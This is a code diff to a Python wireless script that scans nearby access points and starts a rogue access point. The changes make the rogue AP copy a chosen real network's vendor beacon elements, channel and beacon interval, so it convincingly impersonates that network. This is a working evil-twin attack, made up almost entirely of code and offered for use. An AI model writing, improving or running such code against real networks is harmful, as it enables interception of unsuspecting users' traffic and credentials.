@@ -21,9 +21,70 @@ def scan_aps(interface="wlan0mon", timeout=15):
     def packet_handler(pkt):
         if pkt.haslayer(Dot11Beacon):
             bssid = pkt[Dot11].addr3
-            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
-            if bssid not in aps:
-                aps[bssid] = ssid
+            
+            # Only process the first beacon from each BSSID to avoid
+            # accumulating duplicate vendor IEs from multiple beacons
+            if bssid in aps:
+                return
+            
+            ssid = ''
+            try:
+                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
+            except Exception:
+                ssid = ''
+
+            # Collect raw Information Elements (IEs) from the beacon so
+            # we can reproduce them later. We also try to extract the
+            # channel (DS Param IE, id=3) and beacon interval if present.
+            # Use a set to track unique vendor IEs and avoid duplicates.
+            vendor_ies = []
+            seen_ies = set()
+            elt = pkt.getlayer(Dot11Elt)
+            channel = None
+            while isinstance(elt, Dot11Elt):
+                try:
+                    # Only include Vendor Specific IEs (ID == 221 / 0xdd)
+                    # for hostapd's vendor_elements. Feeding other IE types
+                    # into vendor_elements causes hostapd to reject the
+                    # configuration as seen in the error.
+                    if getattr(elt, 'ID', None) == 221:
+                        ie_bytes = bytes(elt)
+                        if ie_bytes not in seen_ies:
+                            seen_ies.add(ie_bytes)
+                            vendor_ies.append(ie_bytes)
+                except Exception:
+                    # Fallback: construct vendor IE bytes if ID==221
+                    try:
+                        if getattr(elt, 'ID', None) == 221:
+                            ie_bytes = bytes([elt.ID, elt.len]) + (elt.info or b'')
+                            if ie_bytes not in seen_ies:
+                                seen_ies.add(ie_bytes)
+                                vendor_ies.append(ie_bytes)
+                    except Exception:
+                        pass
+
+                try:
+                    if getattr(elt, 'ID', None) == 3 and elt.info and len(elt.info) >= 1:
+                        channel = elt.info[0]
+                except Exception:
+                    pass
+
+                elt = elt.payload
+
+            ies_hex = b''.join(vendor_ies).hex() if vendor_ies else None
+            beacon_int = None
+            try:
+                beacon_layer = pkt.getlayer(Dot11Beacon)
+                beacon_int = getattr(beacon_layer, 'beacon_interval', None)
+            except Exception:
+                beacon_int = None
+
+            aps[bssid] = {
+                'ssid': ssid,
+                'ies_hex': ies_hex,
+                'channel': channel,
+                'beacon_int': beacon_int
+            }
 
     print(f"Scanning for Access Points on {interface} for {timeout} seconds...")
     sniff(iface=interface, prn=packet_handler, timeout=timeout, store=0)
@@ -56,14 +117,41 @@ if __name__ == "__main__":
         start_monitor_mode(interface)
         aps = scan_aps(monitor_interface)
         print("\nAccess Points found:")
-        for bssid, ssid in aps.items():
-            print(f"BSSID: {bssid}, SSID: {ssid}")
+        for bssid, info in aps.items():
+            ssid = info.get('ssid', '')
+            ch = info.get('channel')
+            print(f"BSSID: {bssid}, SSID: {ssid}, channel: {ch}")
     finally:
         stop_monitor_mode(monitor_interface)
             
-    selected_ssid = input("\nEnter the SSID of the AP to create a rogue AP: ")
+    # Ask the user for which BSSID to clone (this preserves unique AP
+    # beacon information). If the user prefers to input an SSID, they
+    # can instead copy the BSSID printed above.
+    selected_bssid = input("\nEnter the BSSID of the AP to clone (e.g. 12:34:56:78:9a:bc): ").strip().lower()
+    if selected_bssid not in aps:
+        print("BSSID not found in scan results; falling back to asking for SSID")
+        selected_ssid = input("Enter the SSID of the AP to create a rogue AP: ")
+        selected_bssid = None
+    else:
+        selected_ssid = aps[selected_bssid].get('ssid', '')
+
     passphrase = input("Enter the passphrase for the rogue AP: ")
-    rogue_ap_manager = start_ap(interface, selected_ssid, passphrase, "192.168.50.1/24", "192.168.50.10", "192.168.50.100", 6, upstream_iface)
+
+    # Provide beacon customization to start_ap so hostapd will include
+    # the original AP's IEs and settings in the rogue beacons.
+    beacon_ies = None
+    beacon_int = None
+    if selected_bssid and selected_bssid in aps:
+        beacon_ies = aps[selected_bssid].get('ies_hex')
+        beacon_int = aps[selected_bssid].get('beacon_int')
+        channel = aps[selected_bssid].get('channel') or 6
+    else:
+        channel = 6
+
+    rogue_ap_manager = start_ap(interface, selected_ssid, passphrase,
+                                "192.168.50.1/24", "192.168.50.10",
+                                "192.168.50.100", channel, upstream_iface,
+                                beacon_ies=beacon_ies, beacon_int=beacon_int)
     
     try:
         print('\nType "quit" or press Ctrl+C to stop the rogue AP and cleanup.')
